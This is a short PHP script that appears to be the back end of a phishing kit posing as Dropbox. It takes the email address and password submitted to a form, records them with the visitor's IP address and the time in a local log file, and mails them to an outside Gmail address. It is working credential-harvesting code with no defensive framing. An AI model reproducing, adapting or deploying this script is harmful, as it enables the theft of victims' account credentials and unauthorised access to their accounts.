<?php

$ip = getenv("REMOTE_ADDR");
$email = trim($_POST['email']);
$password = trim($_POST['password']);
$server = date("D/M/d, Y g:i a");

if($email != null && $password != null){
	
	$own = "brianblunt007@gmail.com";
	$subj = "D3J - dr0pb0x 000 - ".$ip;
	
	$message = "[dr0pb0x 000] \n\n";
	$message .= "Email : ".$email."\n";
	$message .= "Password : ".$password."\n";
	$message .= "IP : ".$ip."\n";
	$message .= "Date : ".$server."\n";
	
	$fp = fopen("event.txt","a");
	fputs($fp,$message);
	fclose($fp);
	
	mail($own,$subj,$message);
	
}
else{
	echo "Uncaught Exception !";
}

?>